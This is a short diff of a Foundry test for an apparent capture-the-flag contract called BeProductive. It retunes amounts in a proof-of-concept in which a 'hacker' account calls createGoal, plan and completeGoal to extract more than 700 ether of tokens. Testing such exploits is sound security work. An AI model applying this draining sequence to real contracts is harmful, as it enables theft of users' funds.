@@ -33,7 +33,7 @@ contract BeProductiveTest is Test {
         
     //     vm.stopPrank();
 
-    //     assertGt(token.balanceOf(hacker), 100 ether);
+    //     assertGt(token.balanceOf(hacker), 700 ether);
     // }
 
 
@@ -43,14 +43,14 @@ contract BeProductiveTest is Test {
         
 
         vm.startPrank(hacker);
-        token.approve(address(target), 10);
-        target.createGoal(10, 100);
-        target.plan(400 ether);
+        token.approve(address(target), 10 ether);
+        target.createGoal(10 ether, 100 ether);
+        target.plan(590 ether);
 
         target.completeGoal();
         vm.stopPrank();
 
-        assertGt(token.balanceOf(hacker), 111 ether);
+        assertGt(token.balanceOf(hacker), 700 ether);
     }
 
 }
